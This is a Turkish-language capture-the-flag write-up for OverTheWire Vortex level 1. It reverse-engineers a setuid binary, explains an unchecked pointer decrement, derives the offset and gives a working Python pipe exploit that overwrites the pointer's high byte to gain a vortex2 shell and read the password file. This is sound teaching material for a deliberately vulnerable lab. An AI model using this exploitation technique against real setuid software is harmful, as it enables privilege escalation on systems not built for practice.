# OverTheWire — Vortex Level 1 → 2

> Hedef: `vortex1`'den `vortex2` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: sınırsız `ptr` decrement → işaretçiyi **kendi üstüne** yazdırıp MSB'yi `0xca` yap → gömülü `execlp` shell.
> Ortam: 32-bit x86, stack canary **var** (dokunmuyoruz), NX açık (shellcode gerekmez), **ASLR önemsiz**.

---

## 1. Bağlantı
```bash
ssh vortex1@vortex.labs.overthewire.org -p 2228   # şifre: vortex0'dan alındı
```
`/vortex/vortex1` → `-r-sr-x---  vortex2 vortex1` (setuid vortex2). **Kaynak (`.c`) yok** → `objdump -d -M intel` ile sökülüp mantık çıkarıldı (not stripped, semboller mevcut).

## 2. Analiz (`objdump` → sözde-kod)
```c
char buf[512];              // ebp-0x21c
char *ptr = buf + 256;      // ebp-0x224 ; başlangıç buf+0x100
int x;
while ((x = getchar()) != EOF) {
    if      (x == '\n') print(buf, 512);            // buf'u yazdır
    else if (x == '\\') ptr--;                       // ⚠ SINIR KONTROLÜ YOK
    else {
        if ((ptr & 0xff000000) == 0xca000000) {      // KAZANMA koşulu
            setresuid(geteuid(), geteuid(), geteuid());
            execlp("/bin/sh", "sh", NULL);           // → vortex2 shell
        }
        if (ptr <= buf + 512)                         // sadece ÜST sınır kontrolü
            *ptr++ = (char)x;                         // yaz, sonra ilerle
    }
}
puts("All done");
```

## 3. Zafiyet
- `\` (backslash) → `ptr--` yapar, **hiçbir sınır kontrolü yok** → ptr `buf`'un çok altına inebilir.
- Yazma yalnızca **üst** sınırı (`ptr <= buf+512`) kontrol eder; alt sınır yok → **buf'un altına yazmak serbest**.
- `ptr` değişkeninin kendisi bellekte `buf`'un hemen altında (`ebp-0x224`, buf ise `ebp-0x21c` → 8 byte önce). Yani ptr'yi geri kaydırıp **kendi deposunu** yazma hedefi yapabiliriz.
- Kazanmak için: `ptr`'nin **en anlamlı byte'ı (MSB)** `0xca` olsun → `(ptr & 0xff000000)==0xca000000` → `execlp` shell.

> 💡 **ASLR neden önemsiz:** ptr bir stack adresi (rastgele olabilir) ama biz onun değerini bilmeye çalışmıyoruz — MSB'sine **doğrudan `0xca` yazıyoruz**. Adres ne olursa olsun üst byte 0xca olur.

## 4. Offset (261 nereden geliyor)
- `ptr` başlangıç = `buf+0x100` = `ebp-0x11c`.
- `ptr` değişkeninin MSB'si (little-endian, en yüksek adres) = `ebp-0x224 + 3` = `ebp-0x221`.
- Gereken decrement = `0x221 - 0x11c` = **261** backslash → ptr tam MSB'sini gösterir.
- Sonra `0xca` yaz: `*ptr = 0xca` MSB'yi ezer → `ptr = 0xca______`.
- Bir tetik byte daha (herhangi normal char) → kazanma kontrolü geçer → shell.

## 5. Exploit
```bash
python3 -c '
import sys,time
sys.stdout.buffer.write(b"\\"*261 + b"\xca\xca"); sys.stdout.flush(); time.sleep(1)
sys.stdout.buffer.write(b"id; cat /etc/vortex_pass/vortex2\n"); sys.stdout.flush(); time.sleep(1)
' | /vortex/vortex1
```
Çıktı:
```
uid=5002(vortex2) gid=5001(vortex1) groups=5001(vortex1)
**********
```
> ⚠️ **stdio/EOF tuzağı (resmî ipucu: "how bash handles EOF"):** `getchar` girişi 4 KB'lık stdio tamponuna toptan çeker. Payload'ı komutlarla tek seferde verirsen, `execlp` shell'i doğduğunda tampon eski süreçte kalır, pipe boşalır → shell **anında EOF** alıp kapanır. Çözüm: payload'ı gönder, **kısa bekle** (getchar yesin + shell açılsın), *sonra* komutu besle — böylece komut pipe'ta shell'i bekler.

## Dersler
| Konu | Not |
|------|-----|
| Sınırsız işaretçi | `\` → `ptr--`, sınır kontrolü yok → ptr kendi deposunun üstüne gelebilir |
| Tek-yön sınır | Yazma yalnız üst sınırı (`ptr<=buf+512`) kontrol eder; alt sınır yok |
| Kendini-değiştiren yazma | ptr'yi MSB'sine getir + `0xca` yaz → `(ptr&0xff000000)==0xca000000` kazanır |
| Little-endian | MSB = en yüksek adresli byte (`ebp-0x221`); `0xca` oraya yazılır ([[vortex0]] byte-sırası tekrar) |
| ASLR bağımsız | Adres değerini bilmeye gerek yok; MSB doğrudan yazılıyor |
| stdio/EOF tuzağı | `getchar` tamponlar → payload sonrası bekleyip komut besle (spawn shell okusun) |
| setuid privesc | `execlp` öncesi `setresuid(geteuid×3)` → ruid=vortex2, kabuk yetki düşürmez |
| Kaynak yoksa | `objdump -d -M intel` + `not stripped` semboller → mantığı sözde-koda çıkar |
